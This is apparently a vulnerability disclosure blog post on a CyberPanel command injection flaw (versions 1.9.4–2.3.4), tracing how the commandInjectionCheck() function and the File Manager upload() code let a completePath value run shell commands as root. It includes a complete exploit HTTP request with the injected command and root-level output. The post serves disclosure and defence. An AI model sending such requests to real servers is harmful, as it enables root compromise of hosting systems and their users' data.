---
title:  "[5] CyberPanel - Bypass of Security Controls in `commandInjectionCheck()`"
layout: post
author: Altion
date:   2024-01-22
last_modified_at: 2024-01-27
permalink: /posts/cyberpanel-5
categories: cyberpanel, security, research
---

In CyberPanel versions between 1.9.4 through 2.3.4, the security controls implemented in the `commandInjectionCheck()` function were missing checks for specific forbidden special characters, resulting in command injection.

<table>
    <tr>
        <th>OWASP Top 10</th>
        <td><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="blank">A07:2021</a> - Identification and Authentication Failures</td>
    </tr>
    <tr>
        <th>CWE ID</th>
        <td><a href="https://cwe.mitre.org/data/definitions/78.html" target="blank">CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</td>
    </tr>
    <tr>
        <th>CVSS v4.0 Score</th>
        <td><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N" target="blank">High (8.7)</a></td>
    </tr>
    <tr>
        <th>Vendor URLs</th>
        <td>
            <a href="https://cyberpanel.net/" target="blank">https://cyberpanel.net/</a>
            <br />
            <a href="https://github.com/usmannasir/cyberpanel" target="blank">https://github.com/usmannasir/cyberpanel</a>
        </td>
    </tr>    
    <tr>
        <th>Affected Versions</th>
        <td>1.9.4 - 2.3.4, fixed in v2.3.5</td>
    </tr>
</table>


Authenticated CyberPanel administrators, resellers and users with access to websites can abuse the upload functionality of the File Manager to gain root shell access on the underlying CyberPanel system. Administrative users are considered high-privilege users and are trusted in a CyberPanel instance.

Resellers and users on the other hand, can leverage the the elevated access provided by this vulnerability to gain unrestricted access to the CyberPanel instance. This includes access to the hosted websites, their databases and user data, as well as unrestricted root access in the host system where CyberPanel resides.

In combination with the vulnerability presented in [Authentication Bypass in File Manager's Upload Functionality](/weblog{% post_url 2024-01-22-cyberpanel-3 %}), unauthenticated attackers can exploit this vulnerability to gain root access on the host system of CyberPanel. As a result, it is possible to gain unrestricted privileged access to the CyberPanel instance, hosted websites, their databases and user data as well as unrestricted root access in the host system where CyberPanel resides.

#### Technical Analysis

CyberPanel implements the `commandInjectionCheck()` function to check for special characters in incoming HTTP POST request data. Special characters can have particular meanings to a system shell and can be used to carry out command injection attacks.

If a forbidden special character is identified, the `commandInjectionCheck()` function returns with `1` indicating that the input is malicious (lines 143-148):

```python
# File: plogical/acl.py
22: class ACLManager:
...
140:     @staticmethod
141:     def commandInjectionCheck(value):
142:         try:
143:             if value.find(';') > -1 or value.find('&&') > -1 or value.find('|') > -1 or value.find('...') > -1 \
144:                     or value.find("`") > -1 or value.find("$") > -1 or value.find("(") > -1 or value.find(")") > -1 \
145:                     or value.find("'") > -1 or value.find("[") > -1 or value.find("]") > -1 or value.find(
146:                 "{") > -1 or value.find("}") > -1 \
147:                     or value.find(":") > -1 or value.find("<") > -1 or value.find(">") > -1:
148:                 return 1
149:             else:
150:                 return 0
151:         except BaseException as msg:
152:             logging.writeToFile('%s. [32:commandInjectionCheck]' % (str(msg)))
...
```

Examination of the list of forbidden characters revealed that `commandInjectionCheck()` is missing a check for the single ampersand `&` character. In Linux systems, usage of the ampersand character at the end of a shell command causes the running job to go to the background.

In combination with a consecutive command, the ampersand character can be used to run multiple jobs in a single line. In this case, the checks performed by `commandInjectionCheck()` can be circumvented by using a single ampersand character.

#### Demonstrated use of `commandInjectionCheck()` in code

Files uploaded through the File Manager use the `multipart/form-data` mime type. As part of CyberPanel's functionality, users can upload arbitrary files which might contain special characters (e.g., PHP code).

Since the Security Middleware[^1] can only parse HTTP POST JSON data, all security checks of the 'upload()' function are handled by `commandInjectionCheck()`.

Specifically, `commandInjectionCheck()` is used to ensure that the `completePath` and `filename` parameters do not contain forbidden special characters (lines 817, 839):

```python
# File: filemanager/filemanager.py
781:     def upload(self):
782:         try:
783: 
784:             finalData = {}
785:             finalData['uploadStatus'] = 1
786:             finalData['answer'] = 'File transfer completed.'
...
806:             domainName = self.data['domainName']
807:             try:
808:                 pathCheck = '/home/%s' % (self.data['domainName'])
809:                 website = Websites.objects.get(domain=domainName)
810: 
811:                 command = 'ls -la %s' % (self.data['completePath'])
812:                 result = ProcessUtilities.outputExecutioner(command, website.externalApp)
813:                 #
814:                 if result.find('->') > -1:
815:                     return self.ajaxPre(0, "Symlink attack.")
816: 
817:                 if ACLManager.commandInjectionCheck(self.data['completePath'] + '/' + myfile.name) == 1:
818:                     return self.ajaxPre(0, 'Not allowed to move in this path, please choose location inside home!')
819: 
820:                 if (self.data['completePath'] + '/' + myfile.name).find(pathCheck) == -1 or (
821:                         (self.data['completePath'] + '/' + myfile.name)).find('..') > -1:
822:                     return self.ajaxPre(0, 'Not allowed to move in this path, please choose location inside home!')
...
834:             except:
835:                 pathCheck = '/'
836:                 command = 'ls -la %s' % (self.data['completePath'])
837:                 result = ProcessUtilities.outputExecutioner(command)
838:                 logging.writeToFile("upload file res %s" % result)
839:                 if ACLManager.commandInjectionCheck(self.data['completePath'] + '/' + myfile.name) == 1:
840:                     return self.ajaxPre(0, 'Not allowed to move in this path, please choose location inside home!')
841: 
842:                 if (self.data['completePath'] + '/' + myfile.name).find(pathCheck) == -1 or (
843:                         (self.data['completePath'] + '/' + myfile.name)).find('..') > -1:
844:                     return self.ajaxPre(0, 'Not allowed to move in this path, please choose location inside home!')
...
```

It is now obvious that these checks can be circumvented using a single ampersand character. There are other locations in the code where the `completePath` parameter is used as part of a shell command, however, CyberPanel fails to apply `commandInjectionCheck()` there.

Specifically, in lines 811-812 and 836-837 the shell commands using the `completePath` parameter as input are executed prior to the call of `commandInjectionCheck()`. Further examination revealed that the shell command on lines 836-837 is executed with root privileges.

To trigger this execution flow, it is neccesary to provide an invalid domain name that does not exist in the CyberPanel installation. 

#### Command injection using File Manager's upload functionality

The following HTTP POST call is a file upload request using an invalid and non-existent domain name, `test.locals`. This command injection attack will attempt to write the contents of the `whoami` Linux command to `/tmp/privileged_file`:

```http
POST /filemanager/upload HTTP/1.1
Host: cyberpanel:8090
Cookie: csrftoken=aDUq[...]kzM2Ss; django_language=en; sessionid=kj[...]itd
Content-Length: 766
X-Csrftoken: aDUqoZI4M[...]37sXbhkzM2Ss
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJMm4mR6hU0kF504J
User-Agent: Mozilla/5.0 [...]
Origin: https://cyberpanel:8090
[...]
Connection: close

------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="method"

upload
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="home"

/home/test.local
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="completePath"

/home/test.local/public_html; whoami > /tmp/privileged_file
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="domainRandomSeed"


------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="domainName"

test.locals
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="file"; filename="file.txt"
Content-Type: text/plain

AAA

------WebKitFormBoundaryJMm4mR6hU0kF504J--
```

As expected, the CyberPanel backend responds with an error:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: LiteSpeed
[...]
Connection: close

{
    "status": 0,
    "error_message": "Not allowed to move in this path, please choose location inside home!",
    "uploadStatus": 0
}
```

However, the execution flow was diverted and the command injection payload in the `completePath` parameter was successfully executed with root privileges.

As a result, the  `privileged_file` was written in the `/tmp` directory:

```console
root@cyberpanel:~# ll /tmp
total 128
drwxrwxrwt 23 root      root      4096 Sep 30 01:23 ./
drwxr-xr-x 19 root      root      4096 Sep 28 08:06 ../
-rw-r--r--  1 root      lscpd        7 Sep 30 01:23 privileged_file
root@cyberpanel:~# cat /tmp/privileged_file 
root
```

#### Further Reading

If you're still curious, there might be something behind door number 6 (or 7?!): [Insecure Generation and Storage of API Tokens](/weblog{% post_url 2024-01-22-cyberpanel-6 %})

<h5 class="references">References</h5>

[^1]: [Security Middleware Bypass](/weblog{% post_url 2024-01-22-cyberpanel-4 %})